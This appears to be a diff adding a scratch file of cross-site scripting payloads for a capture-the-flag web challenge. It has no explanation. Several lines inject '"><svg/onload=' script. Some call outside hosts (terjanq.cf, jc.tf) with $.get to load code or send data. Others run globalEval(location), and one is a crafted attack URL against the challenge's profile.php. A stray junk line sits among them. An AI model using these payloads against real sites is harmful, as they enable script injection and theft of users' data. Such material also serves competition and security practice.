@@ -1,0 +1,26 @@
+"><svg/onload=$.get('//terjanq.cf')
+
+
+
+http://terjanq.cf/profile.php
+
+
+
+var r = new XMLHttpRequest();r.onload = function(e) {console.log(r.text);};r.open("GET", "");r.send();
+
+
+
+
+212222222222313333333333333"""""""
+
+
+
+"><svg/onload=$.globalEval(location)
+"><svg/onload=$.get`//jc.tf/${money}`
+
+"><svg/onload=$.globalEval(location);
+
+
+
+web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid="><svg/onload=$.globalEval(location)&
+alert()
